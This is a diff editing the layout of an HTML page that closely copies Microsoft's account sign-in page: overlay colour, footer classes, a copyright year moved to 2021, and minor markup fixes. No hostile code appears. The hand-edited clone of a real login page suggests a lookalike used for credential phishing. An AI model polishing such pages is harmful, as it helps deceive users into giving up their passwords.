@@ -5409,8 +5409,18 @@
         overflow: visible;
         z-index: 99;
         clear: both;
-        background-color: rgba(0, 0, 0, 0.6);
+        background-color: rgba(255, 255, 255, 0.6);
         filter: progid: DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr='#99000000', endColorstr='#99000000')
+    }
+    .left{
+        width: 50%;
+        float: left;
+    }
+    
+    .right{
+        width: 50%;
+        text-align: right;
+        float: right;
     }
     
     .outer {
@@ -6441,7 +6451,7 @@
         }
         .footer.default div.footerNode a,
         .footer.default div.footerNode span {
-            color: #747474
+            color: #747474;
         }
         .footer:lang(ru-ru),
         .footer:lang(uk-ua) {
@@ -10505,7 +10515,7 @@
             <div class=outer>
                 <div class="app middle">
                     <div class=background-logo-holder>
-                        <img class=background-logo src=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAVYAAABIBAMAAABfKsDvAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAwUExURUdwTP///////////////////////////////////////////////////////////0Q+7AIAAAAPdFJOUwB3u0TuEZkzZszdIohVquAaMTsAAAYpSURBVGje1VpNaFxVFJ7JdCaJmfxMI4EKOkkoqFDJBDeihlQkVhCZEbIxaJsuxO6SRXEhghFREBejlbpxEX+wuhAmQnGpVXDdItWNQtqliiSZTNLJT3Od9+59955z7s+b5CUzr3eTzPve+9737j333HPPuYnEYbfU4432VPs5mmn9rNHW2s8RJ62p8VwuN1i4B7R+/w/j7dPfY6615wGm2n+x1tozx2D7NsZaiVTGvoqv1vsZbb/GVetZTSrbmt8H+atLLdPaWdG1smebpu48zgot03qRmdpCc8Tp94usdVo7i0atd5vi7Vn07m2Z1quBuu/ebQgfHxO/ak1ZbIq1Umt6UYh7XfwOVoWp+GnNCGn/Ug9WjZ/WZa7seWqDjA3ETWu6qFtnpnkjaKnWLNd1Bl3kS+5m3LT+ZJr03fwDlmKmdc7kTIVhzMZLa5r34DVyudyswbZSa9J/13aJXO7wL9cPRWt6/JfR0dHbfxqduwmzab3PLIpL2OI/Rr2mwoMO7+cpATzq33jJu/SI+T1vBWvNFX0nZ8Ywx2/+6x9u/Pe2f+vnGksFTC7ibPvlQoEDiDWj1g/UDds0HLJgiENEK56R5i0xFbweReuTKCjGPWvDEMfLyn3ySKVkcWWzUbW+YrglFEMcXOBl+bo93Y67gW0cXGvnIgk0XwOhqBWDHFk191O2+c7v2YioVYviq44Iv2rSWlarKndZO7rWXh9Yj6bVEMXPJsIxwCHuKqjuO23YLIAOP7DWmWDejDx0klqlAwMcM0AG9/nDBi8NnrZqzeVyQz54Pudlwizzgj3m/f9GEccYDgxwjIFVtdu4wkoHG6I1ZN3q4go+4b9+ZLBfXJjiyMKp328NqseUooNqneausYRc9no4pjjKymEdsdY8nk1JONtdmOTgM6tWgloLR6PVf9NWCVMKo3RhkmMGbQPsWucia+UmeYeuhQNhmOLgH3CjBVr7aLzOt3EfhWGSI4sXqqO0gXM+NE999kYYJjnK+IOOUuskCIGBH1wPwwIOPrP2MLXdD+xG0ZrXIqvr8ooLCzhmoMMK1xppLVgBLhMEIpthWMAxBh2W1GrarxYja/VjvlXIOSmfdGGCI0vzFiHxwHoUrXpYRKIeCyY4yshhSd+xatuf7kTWOqzpYWEY/3evSCPrJPXJGFhtn1amWWcvs+zF+wBbG7Vehil0pjk63o4BgW3RusXMLtiQZFsGln24WmthmODIa0YwZ3Gwc+ozD1lrNQwTHH2aeS6bk2xpGJBH0bqqJR2qYZjgEHWMBWqXa2Y3UAdarx1sLdjR/P1uGBZwXGRkceOrQ61kTLucTpgG89x+1ti6lnhaC8MCjhTNYnNHwG6ZooFg3InWyf3ELpsa650wTHLkqX2umIwgifbARWxc+f3EhHDE0mqwXJjk4PE32OjwpCYJYfmM29U/Wdoa1nrDpPUYnRtJ5YVcmOQQs+sWrQ+dMVRop/TwUKrDWgdMWjN0CGfUd7kwxXGVlIOC+taCVi2QCvxB38ahWRNae9HgYB4XpjhStCYo6oa7yizOkrzdMhrnskHrsHHPXcEDnWJNYjSXUdfqsfI8zksiu/QCdmBTcBNHtG4k7PnIOk5iToVjiiND3Jasc3/BL/0RJBsLOG8s5uNNrDVNBhNq7UBHZ7qKsCtdGF1PwGSaDgKw2kguNxQcHwA9nwTV5R9oYle9c4JqFUOw/Z4/AGPoORcGOKaJ27Kcy1ig6wW7MjhxovGniLTy19TOP3FCz7/mxYMjgxNDFVKPdmAwV8xAjsNrb5qk1rWgK2hlpDXvyBVnNFZleg5Mt/lN/WQGfBBsypSV+CpR7CImnqVeQI+oQTdux/TaBoicsrrWz+Da0AWRr7HWrEtrxtqtLsyQG69bqmJeewbHB9chJdaarrjqW3lHD1gxU80BDDM5pLe5ZDwQ4bVvcPwKaj8mrbiIhXvAiplqOcB40vBIKXtO23/dDKC9EtUqX2mscXZV7D1gwzBHWY+wn5YP1i4YaufB2aJCgmpNJMWTLxprx70rAe/HWiXVgmGOpL77TvS849fXL/08bzwo8NfJhue+bTxVkjreUPvlg7YjBuN/e07/1If7xe7h9j+U2KvMdpuOpwAAAABJRU5ErkJggg==> </div>
+                        <img class=background-logo src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAVYAAABIBAMAAABfKsDvAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAwUExURUdwTP///////////////////////////////////////////////////////////0Q+7AIAAAAPdFJOUwB3u0TuEZkzZszdIohVquAaMTsAAAYpSURBVGje1VpNaFxVFJ7JdCaJmfxMI4EKOkkoqFDJBDeihlQkVhCZEbIxaJsuxO6SRXEhghFREBejlbpxEX+wuhAmQnGpVXDdItWNQtqliiSZTNLJT3Od9+59955z7s+b5CUzr3eTzPve+9737j333HPPuYnEYbfU4432VPs5mmn9rNHW2s8RJ62p8VwuN1i4B7R+/w/j7dPfY6615wGm2n+x1tozx2D7NsZaiVTGvoqv1vsZbb/GVetZTSrbmt8H+atLLdPaWdG1smebpu48zgot03qRmdpCc8Tp94usdVo7i0atd5vi7Vn07m2Z1quBuu/ebQgfHxO/ak1ZbIq1Umt6UYh7XfwOVoWp+GnNCGn/Ug9WjZ/WZa7seWqDjA3ETWu6qFtnpnkjaKnWLNd1Bl3kS+5m3LT+ZJr03fwDlmKmdc7kTIVhzMZLa5r34DVyudyswbZSa9J/13aJXO7wL9cPRWt6/JfR0dHbfxqduwmzab3PLIpL2OI/Rr2mwoMO7+cpATzq33jJu/SI+T1vBWvNFX0nZ8Ywx2/+6x9u/Pe2f+vnGksFTC7ibPvlQoEDiDWj1g/UDds0HLJgiENEK56R5i0xFbweReuTKCjGPWvDEMfLyn3ySKVkcWWzUbW+YrglFEMcXOBl+bo93Y67gW0cXGvnIgk0XwOhqBWDHFk191O2+c7v2YioVYviq44Iv2rSWlarKndZO7rWXh9Yj6bVEMXPJsIxwCHuKqjuO23YLIAOP7DWmWDejDx0klqlAwMcM0AG9/nDBi8NnrZqzeVyQz54Pudlwizzgj3m/f9GEccYDgxwjIFVtdu4wkoHG6I1ZN3q4go+4b9+ZLBfXJjiyMKp328NqseUooNqneausYRc9no4pjjKymEdsdY8nk1JONtdmOTgM6tWgloLR6PVf9NWCVMKo3RhkmMGbQPsWucia+UmeYeuhQNhmOLgH3CjBVr7aLzOt3EfhWGSI4sXqqO0gXM+NE999kYYJjnK+IOOUuskCIGBH1wPwwIOPrP2MLXdD+xG0ZrXIqvr8ooLCzhmoMMK1xppLVgBLhMEIpthWMAxBh2W1GrarxYja/VjvlXIOSmfdGGCI0vzFiHxwHoUrXpYRKIeCyY4yshhSd+xatuf7kTWOqzpYWEY/3evSCPrJPXJGFhtn1amWWcvs+zF+wBbG7Vehil0pjk63o4BgW3RusXMLtiQZFsGln24WmthmODIa0YwZ3Gwc+ozD1lrNQwTHH2aeS6bk2xpGJBH0bqqJR2qYZjgEHWMBWqXa2Y3UAdarx1sLdjR/P1uGBZwXGRkceOrQ61kTLucTpgG89x+1ti6lnhaC8MCjhTNYnNHwG6ZooFg3InWyf3ELpsa650wTHLkqX2umIwgifbARWxc+f3EhHDE0mqwXJjk4PE32OjwpCYJYfmM29U/Wdoa1nrDpPUYnRtJ5YVcmOQQs+sWrQ+dMVRop/TwUKrDWgdMWjN0CGfUd7kwxXGVlIOC+taCVi2QCvxB38ahWRNae9HgYB4XpjhStCYo6oa7yizOkrzdMhrnskHrsHHPXcEDnWJNYjSXUdfqsfI8zksiu/QCdmBTcBNHtG4k7PnIOk5iToVjiiND3Jasc3/BL/0RJBsLOG8s5uNNrDVNBhNq7UBHZ7qKsCtdGF1PwGSaDgKw2kguNxQcHwA9nwTV5R9oYle9c4JqFUOw/Z4/AGPoORcGOKaJ27Kcy1ig6wW7MjhxovGniLTy19TOP3FCz7/mxYMjgxNDFVKPdmAwV8xAjsNrb5qk1rWgK2hlpDXvyBVnNFZleg5Mt/lN/WQGfBBsypSV+CpR7CImnqVeQI+oQTdux/TaBoicsrrWz+Da0AWRr7HWrEtrxtqtLsyQG69bqmJeewbHB9chJdaarrjqW3lHD1gxU80BDDM5pLe5ZDwQ4bVvcPwKaj8mrbiIhXvAiplqOcB40vBIKXtO23/dDKC9EtUqX2mscXZV7D1gwzBHWY+wn5YP1i4YaufB2aJCgmpNJMWTLxprx70rAe/HWiXVgmGOpL77TvS849fXL/08bzwo8NfJhue+bTxVkjreUPvlg7YjBuN/e07/1If7xe7h9j+U2KvMdpuOpwAAAABJRU5ErkJggg=="> </div>
                     <div class="app fade-in-lightbox inner">
 
 						  <div class="lightbox-cover disable-lightbox hide-vals" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
@@ -10552,7 +10562,7 @@
                                                 <div class=col-md-24>
                                                     <div class="text-13 action-links">
                                                         <div class="form-group">
-                                                            <a id="cantAccessAccount" name="cannotAccessAccount" href="#">Can&#39t access your account?</a>
+                                                            <a id="cantAccessAccount" name="cannotAccessAccount" href="#">Can't access your account?</a>
                                                         </div>
                                                     </div>
                                                 </div>
@@ -10684,26 +10694,26 @@
                             </div>
                         </div>
 
-                        <div>
-                        </div>
-                        <div class=footer id=footer>
-                            <div>
-                                <div class="footerNode text-secondary">
-                                    <span>&copy;2019 Microsoft</span>
-                                    <a href="#">Terms of use</a>
-                                    <a href="#">Privacy & cookies</a>
-                                    <a href="#">
-                                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNMS4xNDMsNi44NTdhMS4xMDcsMS4xMDcsMCwwLDEsLjQ0Ni4wODksMS4xNjQsMS4xNjQsMCwwLDEsLjYwNy42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMCwuODkzLDEuMTY0LDEuMTY0LDAsMCwxLS42MDcuNjA3LDEuMTA3LDEuMTA3LDAsMCwxLS40NDYuMDg5QTEuMTA3LDEuMTA3LDAsMCwxLC43LDkuMDU0YTEuMTY0LDEuMTY0LDAsMCwxLS42MDctLjYwNywxLjE2MSwxLjE2MSwwLDAsMSwwLS44OTNBMS4xNjQsMS4xNjQsMCwwLDEsLjcsNi45NDZhMS4xMDcsMS4xMDcsMCwwLDEsLjQ0Ni0uMDg5TTgsNi44NTdhMS4xMDcsMS4xMDcsMCwwLDEsLjQ0Ni4wODksMS4xNjQsMS4xNjQsMCwwLDEsLjYwNy42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMCwuODkzLDEuMTY0LDEuMTY0LDAsMCwxLS42MDcuNjA3LDEuMTYxLDEuMTYxLDAsMCwxLS44OTMsMCwxLjE2NCwxLjE2NCwwLDAsMS0uNjA3LS42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMC0uODkzLDEuMTY0LDEuMTY0LDAsMCwxLC42MDctLjYwN0ExLjEwNywxLjEwNywwLDAsMSw4LDYuODU3bTYuODU3LDBhMS4xMDcsMS4xMDcsMCwwLDEsLjQ0Ni4wODksMS4xNjQsMS4xNjQsMCwwLDEsLjYwNy42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMCwuODkzLDEuMTY0LDEuMTY0LDAsMCwxLS42MDcuNjA3LDEuMTYxLDEuMTYxLDAsMCwxLS44OTMsMCwxLjE2NCwxLjE2NCwwLDAsMS0uNjA3LS42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMC0uODkzLDEuMTY0LDEuMTY0LDAsMCwxLC42MDctLjYwN0ExLjEwNywxLjEwNywwLDAsMSwxNC44NTcsNi44NTdaIi8+PC9zdmc+">
-                                    </a>
-                                </div>
-                            </div>
-                        </div>
+            <div></div>
                     </div>
                 </div>
             </div>
         </form>
 
     </div>
+    
+    <div class="footer">
+                <div class="left"></div>
+                <div class="right">
+                    <span>&copy;2021 Microsoft</span>
+                                    <a href="#">Terms of use</a> &nbsp;
+                                    <a href="#">Privacy &amp; cookies</a> &nbsp;
+                                    <a href="#">
+                                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNMS4xNDMsNi44NTdhMS4xMDcsMS4xMDcsMCwwLDEsLjQ0Ni4wODksMS4xNjQsMS4xNjQsMCwwLDEsLjYwNy42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMCwuODkzLDEuMTY0LDEuMTY0LDAsMCwxLS42MDcuNjA3LDEuMTA3LDEuMTA3LDAsMCwxLS40NDYuMDg5QTEuMTA3LDEuMTA3LDAsMCwxLC43LDkuMDU0YTEuMTY0LDEuMTY0LDAsMCwxLS42MDctLjYwNywxLjE2MSwxLjE2MSwwLDAsMSwwLS44OTNBMS4xNjQsMS4xNjQsMCwwLDEsLjcsNi45NDZhMS4xMDcsMS4xMDcsMCwwLDEsLjQ0Ni0uMDg5TTgsNi44NTdhMS4xMDcsMS4xMDcsMCwwLDEsLjQ0Ni4wODksMS4xNjQsMS4xNjQsMCwwLDEsLjYwNy42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMCwuODkzLDEuMTY0LDEuMTY0LDAsMCwxLS42MDcuNjA3LDEuMTYxLDEuMTYxLDAsMCwxLS44OTMsMCwxLjE2NCwxLjE2NCwwLDAsMS0uNjA3LS42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMC0uODkzLDEuMTY0LDEuMTY0LDAsMCwxLC42MDctLjYwN0ExLjEwNywxLjEwNywwLDAsMSw4LDYuODU3bTYuODU3LDBhMS4xMDcsMS4xMDcsMCwwLDEsLjQ0Ni4wODksMS4xNjQsMS4xNjQsMCwwLDEsLjYwNy42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMCwuODkzLDEuMTY0LDEuMTY0LDAsMCwxLS42MDcuNjA3LDEuMTYxLDEuMTYxLDAsMCwxLS44OTMsMCwxLjE2NCwxLjE2NCwwLDAsMS0uNjA3LS42MDcsMS4xNjEsMS4xNjEsMCwwLDEsMC0uODkzLDEuMTY0LDEuMTY0LDAsMCwxLC42MDctLjYwN0ExLjEwNywxLjEwNywwLDAsMSwxNC44NTcsNi44NTdaIi8+PC9zdmc+">
+                                    </a>
+                
+                </div>
+            </div>
 
     <script>
         $(document).ready(function(){
